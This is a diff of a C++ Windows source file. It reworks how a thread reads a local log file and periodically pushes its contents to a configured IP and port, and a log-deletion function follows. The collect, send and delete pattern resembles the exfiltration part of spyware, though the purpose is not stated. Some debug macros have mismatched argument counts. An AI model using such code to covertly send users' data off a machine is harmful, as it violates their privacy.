@@ -1,19 +1,7 @@
 #include "push.h"
 #include "constants.h"
 
-#define BUFFER_SIZE 1024
 #define OK 200
-DWORD g_BytesTransferred = 0;
-
-VOID CALLBACK FileIOCompletionRoutine(
-    __in DWORD dwErrorCode,
-    __in DWORD dwNumberOfBytesTransfered,
-    __in LPOVERLAPPED lpOverlapped)
-{
-    _RPT1(_CRT_WARN, __FUNCTION__ ": Error code = 0x%x\n", dwErrorCode);
-    _RPT1(_CRT_WARN, __FUNCTION__ ": Number of bytes = 0x%x\n", dwNumberOfBytesTransfered);
-    g_BytesTransferred = dwNumberOfBytesTransfered;
-}
 
 DWORD WINAPI PushThread(LPVOID lpParam)
 {
@@ -27,18 +15,18 @@ DWORD WINAPI PushThread(LPVOID lpParam)
     _RPT1(_CRT_WARN, __FUNCTION__ ": Push Port = %d\n", port);
     _RPT1(_CRT_WARN, __FUNCTION__ ": Push Period = %d\n", period);
 
-    CHAR buffer[BUFFER_SIZE] = { 0 };
-    OVERLAPPED ol = { 0 };
-
     while (true)
     {
         Sleep(period);
-        
-        DWORD dwBytesRead = ReadLog(buffer, ol);
-        if (dwBytesRead == 0)
+
+        CHAR* buffer = nullptr;
+        DWORD dwBytesRead = ReadLog(&buffer);
+        if (dwBytesRead == 0 || buffer == nullptr)
             continue;
 
         DWORD dwStatusCode = Push(ip, port, buffer, dwBytesRead);
+        if (buffer != nullptr)
+            delete[] buffer;
         if (dwStatusCode != OK)
             continue;
         
@@ -46,8 +34,9 @@ DWORD WINAPI PushThread(LPVOID lpParam)
     }
 }
 
-DWORD ReadLog(CHAR* buffer, OVERLAPPED& ol)
+DWORD ReadLog(CHAR** buffer)
 {
+    DWORD dwFileSize = 0;
     DWORD dwBytesRead = 0;
     HANDLE hFile = CreateFile(
         OUTPUT_FILE_NAME,
@@ -64,28 +53,38 @@ DWORD ReadLog(CHAR* buffer, OVERLAPPED& ol)
         goto done;
     }
 
-    _RPT1(_CRT_WARN, __FUNCTION__ ": Open file '%s' for reading. Handle = 0x%x\n", OUTPUT_FILE_NAME, hFile);
+    dwFileSize = GetFileSize(hFile, nullptr);
+    *buffer = new CHAR[dwFileSize + 1];
+    ZeroMemory(*buffer, dwFileSize + 1);
 
-    if (!ReadFileEx(hFile, buffer, BUFFER_SIZE - 1, &ol, FileIOCompletionRoutine))
+    _RPT2(_CRT_WARN, __FUNCTION__ ": Open file '%s' for reading (%d bytes). Handle = 0x%x\n", OUTPUT_FILE_NAME, dwFileSize, hFile);
+    if (!ReadFile(hFile, *buffer, dwFileSize, &dwBytesRead, nullptr))
     {
         _RPT2(_CRT_ERROR, __FUNCTION__ ": Failed to read file '%s' (0x%x)\n", OUTPUT_FILE_NAME, GetLastError());
-        return dwBytesRead;
+        delete[] *buffer;
+        return 0;
     }
 
-    dwBytesRead = ol.InternalHigh;
     if (dwBytesRead == 0)
     {
         _RPT2(_CRT_WARN, __FUNCTION__ ": No bytes read from '%s' (0x%x)\n", OUTPUT_FILE_NAME, GetLastError());
-        return dwBytesRead;
+        delete[] *buffer;
+        return 0;
+    }
+
+    if (dwBytesRead != dwFileSize)
+    {
+        _RPT4(_CRT_WARN, __FUNCTION__ ": Failed to read entire %s file (File Size: %d, Bytes Read: %d, Last Error: 0x%x)",
+            OUTPUT_FILE_NAME, dwFileSize, dwBytesRead, GetLastError());
+        delete[] *buffer;
+        return 0;
     }
 
     _RPT1(_CRT_WARN, __FUNCTION__ ": Read %d bytes from '%s'\n", dwBytesRead, OUTPUT_FILE_NAME);
-    buffer[dwBytesRead] = '\0';
-    dwBytesRead += 1;
 
 done:
     if (hFile) CloseHandle(hFile);
-    return dwBytesRead;
+    return dwBytesRead + 1 /* null terminator */;
 }
 
 BOOL DeleteLog()
